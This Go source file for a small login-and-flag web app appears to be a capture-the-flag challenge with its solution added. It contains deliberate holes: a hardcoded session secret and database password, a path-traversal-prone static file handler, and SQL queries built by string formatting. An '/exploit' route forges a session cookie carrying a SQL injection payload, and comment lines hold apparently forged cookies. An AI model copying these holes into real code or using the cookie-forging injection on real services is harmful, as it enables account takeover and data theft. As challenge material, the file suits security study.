package main

import (
	"database/sql"
	"fmt"
	"html/template"
	"log"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/gorilla/sessions"
)

type User struct {
	Username sql.NullString
	Flag     sql.NullString
}

func main() {
	store := sessions.NewCookieStore([]byte("d2908c1de1cd896d90f09df7df67e1d4"))
	templates, _ := template.ParseGlob("templates/*.html")

	db, err := sql.Open("mysql", "user:pa55w0rd@tcp(database:3306)/db")
	if err != nil {
		log.Println(err)
	}
	db.SetConnMaxLifetime(time.Minute * 3)
	db.SetMaxOpenConns(30)
	db.SetMaxIdleConns(10)

	http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {

		filename := strings.TrimPrefix(r.URL.Path, "/static/")

		content, err := os.ReadFile(filepath.Join("./static/", filename))

		if err != nil {
			http.Error(w, "404 Not found", http.StatusNotFound)
			return
		}

		w.Header().Add("Content-Type", mime.TypeByExtension(filepath.Ext(filename)))
		w.Write([]byte(content))
	})

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
			
		var IsLetter = regexp.MustCompile(`^[0-9a-zA-Z]+$`).MatchString

		switch r.Method {
		case http.MethodPost:
			if err := r.ParseForm(); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			if !IsLetter(r.FormValue("username")) || !IsLetter(r.FormValue("password")) {
				w.Write([]byte("Incorrect username or password"))
				return
			}

			var username string
			var password string
			query := fmt.Sprintf(
				"SELECT username, password FROM users WHERE username='%s' and password='%s'",
				r.FormValue("username"), r.FormValue("password"))
			err := db.QueryRow(query).Scan(&username, &password)

			if err != nil {
				log.Println(err)
				w.Write([]byte("Incorrect username or password"))
				return
			}

			session, _ := store.Get(r, "session")
			session.Values["username"] = username
			err = session.Save(r, w)
			if err != nil {
				log.Println(err)
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			http.Redirect(w, r, "/", http.StatusFound)

		default:
			templates.ExecuteTemplate(w, "login.html", nil)
		}
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {

		session, _ := store.Get(r, "session")

		username := session.Values["username"]
		log.Println("username")
		log.Println(username)

		if session.Values["username"] == nil {
			http.Redirect(w, r, "/login", http.StatusFound)
			return
		}

		query := fmt.Sprintf("SELECT username, flag FROM users WHERE username='%s'", username)
		row := db.QueryRow(query)
		var user User
		row.Scan(&user.Username, &user.Flag)
		log.Println("user")
		log.Println(user)

		templates.ExecuteTemplate(w, "index.html", user)
	})
	
	http.HandleFunc("/exploit", func(w http.ResponseWriter, r *http.Request) {
		session, _ := store.Get(r, "session")

		session.Values["username"] = "test' or flag like 'FLAG{%"
		err = session.Save(r, w)
		w.Write([]byte("Check the custom cookie in dev tools."))
	})
	http.ListenAndServe(":9453", nil)
}

// MTYzNTE1MDQwOHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dIQUFWaFpHMXBiZz09fIAtBbvDokq61bRmk29DT-3RFGD_Og8FRV5OAikD72ma
// MTYzNzQwNzc2NHxEdi1CQkFFQ180SUFBUkFCRUFBQWJmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3hOQUV0bVppY2dWVTVKVDA0Z1UwVk1SVU5VSUhWelpYSnVZVzFsTENCbWJHRm5JRVpTVDAwZ2RYTmxjbk1nZDJobGNtVWdabXhoWnlCc2FXdGxJQ2RHVEVGSGV5VW5JRzl5SURJOUp6RT18CC6IfR-WNSbXY176IxsRXpuVLm5z0ymr9NY_AVL4L4c=
